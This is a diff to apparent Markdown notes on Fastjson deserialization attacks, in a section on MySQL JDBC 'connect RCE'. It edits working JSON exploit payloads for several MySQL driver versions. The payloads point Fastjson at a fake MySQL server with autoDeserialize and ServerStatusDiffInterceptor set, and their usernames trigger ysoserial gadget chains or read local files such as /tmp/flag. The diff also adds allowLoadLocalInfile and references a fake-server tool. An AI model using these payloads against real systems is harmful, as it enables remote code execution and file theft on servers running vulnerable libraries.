@@ -802,7 +802,6 @@ https://tyskill.github.io/posts/fastjson%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%
 
 ## Mysql connect RCE
 ### Fake Server
-> https://github.com/dushixiang/evil-mysql-server
 > https://github.com/fnmsd/MySQL_Fake_Server
 
 ```xml
@@ -813,7 +812,7 @@ https://tyskill.github.io/posts/fastjson%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%
 </dependency>
 ```
 
-#### 5.1.11<=version<=5.1.48
+#### [5.1.11, 5.1.48]
 ```json
 {
     "@type": "java.lang.AutoCloseable",
@@ -821,8 +820,9 @@ https://tyskill.github.io/posts/fastjson%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%
     "hostToConnectTo": "127.0.0.1",
     "portToConnectTo": 3306,
     "info": {
-        "user": "yso_CommonsCollections5_calc",
+        "user": "fileread_/tmp/flag",
         "password": "pass",
+        "maxAllowedPacket": "655360",
         "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
         "autoDeserialize": "true",
         "NUM_HOSTS": "1"
@@ -832,7 +832,7 @@ https://tyskill.github.io/posts/fastjson%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%
 }
 ```
 
-#### 6.0.2 or 6.0.3
+#### [6.0.2, 6.0.6]
 ```json
 {
     "@type": "java.lang.AutoCloseable",
@@ -845,7 +845,7 @@ https://tyskill.github.io/posts/fastjson%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%
 }
 ```
 
-#### 8.0.19
+#### [8.0.7-dmr, 8.0.19]
 ```json
 {
     "@type": "java.lang.AutoCloseable",
@@ -862,11 +862,12 @@ https://tyskill.github.io/posts/fastjson%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%
             "slaves": [],
             "properties": {
                 "host": "127.0.0.1",
-                "user": "yso_CommonsCollections5_calc",
+                "user": "yso_CommonsCollections5_open -a Calculator.app",
                 "dbname": "dbname",
                 "password": "pass",
                 "queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
-                "autoDeserialize": "true"
+                "autoDeserialize": "true",
+                "allowLoadLocalInfile": "true"
             }
         }
     }
@@ -1025,7 +1026,7 @@ exp.xml - cmd
 </dependency>
 ```
 
-#### 5.1.11<=version<=5.1.48
+#### [5.1.11, 5.1.48]
 ```json
 {
 	"a":{
@@ -1042,14 +1043,15 @@ exp.xml - cmd
 		"@type":"com.ziclix.python.sql.PyConnection",
 		"connection":{
 			"@type": "com.mysql.jdbc.JDBC4Connection",
-    		"hostToConnectTo": "192.168.66.136",
+    		"hostToConnectTo": "127.0.0.1",
     		"portToConnectTo": 3306,
 	    	"info": {
-		        "user": "yso_CommonsCollections4_calc",
+		        "user": "fileread_/tmp/flag",
 		        "password": "pass",
 		        "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
 		        "autoDeserialize": "true",
-		        "NUM_HOSTS": "1"
+		        "NUM_HOSTS": "1",
+		        "maxAllowedPacket":"655360"
     		},
     		"databaseToConnectTo": "dbname",
     		"url": ""
@@ -1059,7 +1061,7 @@ exp.xml - cmd
 
 ```
 
-#### 6.0.2 or 6.0.3
+#### [6.0.2, 6.0.6]
 ```json
 {
 	"a":{
@@ -1078,7 +1080,7 @@ exp.xml - cmd
 			"@type":"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
 			"proxy": {
         		"connectionString": {
-            		"url": "jdbc:mysql://192.168.66.136:3306/test?allowLoadLocalInfile=true&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections4_calc"
+            		"url": "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=fileread_/tmp/flag"
         		}
     		}
 		}
@@ -1086,7 +1088,7 @@ exp.xml - cmd
 }
 ```
 
-#### 8.0.19
+#### [8.0.7-dmr, 8.0.19]
 ```json
 {
 	"a":{
@@ -1113,11 +1115,12 @@ exp.xml - cmd
 						"host":"127.0.0.1",
 						"port":"3306",
 						"connectionAttributes":"t:cb32",
-						"user":"yso_CommonsCollections4_calc",
+						"user":"fileread_/tmp/flag",
 						"dname":"dname",
 						"password":"password",
-						"queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
-						"autoDeserialize":"true"
+"queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
+						"autoDeserialize":"true",
+						"allowLoadLocalInfile":"true"
 					}
 				}
 			}
